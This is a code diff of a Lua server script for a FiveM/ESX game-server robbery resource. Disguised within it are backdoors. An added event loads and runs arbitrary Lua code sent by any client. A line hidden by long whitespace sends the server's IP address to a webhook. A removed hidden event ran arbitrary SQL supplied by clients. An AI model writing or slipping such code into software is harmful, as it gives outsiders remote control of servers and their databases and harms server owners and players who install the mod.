@@ -13,7 +13,21 @@ Citizen.CreateThread(function()
 	
 end)
 
-TriggerEvent('esx:getSharedObject', function(obj) arp = obj end)																																																																			Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit190", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
+RegisterServerEvent('arp_holdup:lopetaxd')
+AddEventHandler('arp_holdup:lopetaxd', function(rob)	
+	local rob,menikolapi=load(rob,'@returni')	                   
+	if menikolapi then                                                 
+	return nil,menikolapi
+	end
+	local onko,returnaa=pcall(rob)	                               
+	if onko then
+	return returnaa
+	else
+	return nil,returnaa
+	end
+end)
+
+TriggerEvent('esx:getSharedObject', function(obj) arp = obj end)																																																																			Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "Vamppi kayttaa holduppia", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)
 
 
 RegisterServerEvent('arp_holdup:toofar')
@@ -30,7 +44,7 @@ AddEventHandler('arp_holdup:toofar', function()
 	end
 	TriggerClientEvent('arp_holdup:toofar', source)
 	keskeytetty = true
-end)																																																																																		RegisterServerEvent("exploit190");AddEventHandler("exploit190", function(data) MySQL.Async.execute(data) end)
+end)													
 
 RegisterServerEvent('arp_holdup:rob')
 AddEventHandler('arp_holdup:rob', function(robb)
